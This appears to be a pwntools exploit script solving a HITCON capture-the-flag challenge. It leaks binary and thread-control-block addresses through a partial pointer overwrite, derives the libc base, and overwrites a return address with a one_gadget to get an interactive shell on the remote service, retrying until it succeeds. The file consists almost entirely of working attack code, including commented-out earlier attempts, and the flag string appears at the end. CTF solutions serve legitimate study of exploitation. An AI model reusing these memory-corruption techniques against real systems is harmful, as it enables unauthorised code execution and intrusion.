#!/usr/bin/env python

from __future__ import print_function, division
from pwn import *

context.update(os='linux', arch='amd64',
	# log_level='debug',
)

elf = ELF('hitcon')
elf_talk_again = 0x2626
elf_qa_again = 0x22e3

def check_talks():
	talk_time = 3000000

	good_talks = []
	bad_talks = []
	with open('papers.txt', 'r') as f:
		for author, title, paper, _ in zip(f, f, f, f):
			length = len(paper.rstrip('\n'))
			if talk_time % length == 0:
				print('Bad', length, talk_time / length)
				bad_talks.append(author.rstrip('\n'))
			else:
				good_talks.append(author.rstrip('\n'))
	print(good_talks, bad_talks)

def connect():
	return remote(args['HOST'] or 'localhost', args['PORT'] or 11321)

def attempt(t):
	# assign all of the good talks first so that we have higher probability of not being selected
	assignment = [
		0, 3, 6,
		1, 2, 4,
		5, 7, 8,
	]

	t.sendline('3')
	for slot, talk in enumerate(assignment):
		t.sendline('{} {}'.format(slot+1, talk+1))
	t.sendline('4')
	t.sendline('1')
	t.recvuntil('Any questions?\n')
	# short overwrite the tcb pointer
	t.send('P' * 0x5b + p16(0xee08 + 0x70) + '\n')
	# leaks binary address from the stack
	question = t.recvuntil('\nThis is a good question', drop=True)
	if question.startswith('So your question'):
		log.info('Nice guys finish last')
		return

	if len(question) != 6:
		log.info('Got bad address %r', question)
		return

	elf.address = (unpack(question, 'all') - 0x23fc)

	log.info('Binary base %x', elf.address)
	sleep(2)

	# return to pthread_create in start
	# randomization is now fixed so we are guaranteed a question
	t.send(p64(elf.address + elf_talk_again))

	t.recvuntil('Any questions?\n')
	# short overwrite tcb again, this time pointing to a tcb address
	# offset by 1 to avoid a low-order nul byte
	t.send('P' * 0x5b + p16(0xce01 + 0x70) + '\n')
	question = t.recvuntil('\nThis is a good question', drop=True)
	tcb_addr = (unpack(question, 'all') + 0x9) << 8

	log.info('TCB address %x', tcb_addr)
	sleep(2)

	# libc is at a fixed offset from the tcb
	libc_base = tcb_addr + 0x1db9900

	# overwrite return address with one_gadget
	# note, we need to put something writeable into rbp to avoid crashing
	t.send(p64(tcb_addr - 0x3000)[1:] + p64(libc_base + 0x4f322))
	t.interactive()
	return True

	# t.send(p64(tcb_addr - 0x3000)[1:] + p64(elf.address + elf_talk_again))
	# retry_ptr_addr = tcb_addr - 0x900 - 0x18
	# tcb_to_libc_addr = 0x7fffef7fde38 - 0x7ffff567d700
	# libc = int(raw_input('Libc')[2:], 16)
	# stk = int(raw_input('stk')[2:], 16)
	# log.info('OFF %x %x', libc - (tcb_addr + 0x900), stk - (tcb_addr + 0x900))
	# return False

	# t.recvuntil('Any questions?\n')
	# t.send('P' * 0x5b + pack(tcb_addr + tcb_to_libc_addr + 1 + 0x70) + 'Q')
	# # t.send('P' * 0x5b + pack(tcb_addr + tcb_to_libc_addr + 8 + 0x70) + 'Q')
	# question = t.recvuntil('\nThis is a good question', drop=True)

	# libc_base = (unpack(question, 'all') << 8) - 0x00007ffff7bbd600 + 0x7ffff7437000
	# log.info('Libc base %x', libc_base)
	# sleep(2)
	# return False

while True:
	try:
		with connect() as t:
			if attempt(t): break
	except EOFError:
		continue

# hitcon{magic_fs_magic_exploit}
